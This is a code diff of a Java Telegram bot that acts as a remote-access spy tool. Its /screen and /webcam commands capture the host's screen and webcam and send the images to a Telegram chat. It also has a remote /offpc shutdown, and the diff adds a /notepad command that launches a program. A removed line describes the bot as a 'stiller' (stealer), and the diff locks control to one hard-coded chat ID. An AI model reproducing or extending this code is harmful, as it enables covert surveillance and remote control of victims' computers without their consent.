@@ -30,7 +30,7 @@ public class Hello extends TelegramLongPollingBot {
         if (command.equals("/run") || command.equals("/start") || command.equals("/menu") || command.startsWith("/open")
         ) {
             SendMessage response = new SendMessage();
-            String message = "Hello im work as a stiller do you want /screen /webcam ?";
+            String message = "Hello do you want /screen /webcam /offpc /notepad ?";
             response.setChatId(update.getMessage().getChatId().toString());
             response.setText(message);
             try {
@@ -52,7 +52,7 @@ public class Hello extends TelegramLongPollingBot {
                 switch (command) {
 
                     case "/screen":
-                        if (!response.getChatId().equals("")) {
+                        if (response.getChatId().equals("5401328104")) {
                             photo.setChatId(update.getMessage().getChatId().toString());
                             Starter.callScreen();
                             Thread.sleep(2000);
@@ -70,7 +70,7 @@ public class Hello extends TelegramLongPollingBot {
                         }
                         break;
                     case "/webcam":
-                        if (!response.getChatId().equals("")) {
+                        if (response.getChatId().equals("5401328104")) {
                             photo.setChatId(update.getMessage().getChatId().toString());
                             Starter.callCam();
                             Thread.sleep(2000);
@@ -87,11 +87,24 @@ public class Hello extends TelegramLongPollingBot {
                         }
                         break;
                     case "/offpc":
-                        if (!response.getChatId().equals("")) {
+                        if (response.getChatId().equals("5401328104")) {
                             offPc();
                         }else{
                             response.setText("You not have permission by this bot");
                         execute(response);}
+                        break;
+                    case "/notepad":
+                        if (response.getChatId().equals("5401328104")) {
+                            Runtime rs = Runtime.getRuntime();
+                            try {
+                                rs.exec("notepad");
+                            }
+                            catch (IOException e) {
+                                System.out.println(e);
+                            }
+                        }else{
+                            response.setText("You not have permission by this bot");
+                            execute(response);}
                         break;
                     default:
                         response.setText("Bad command");
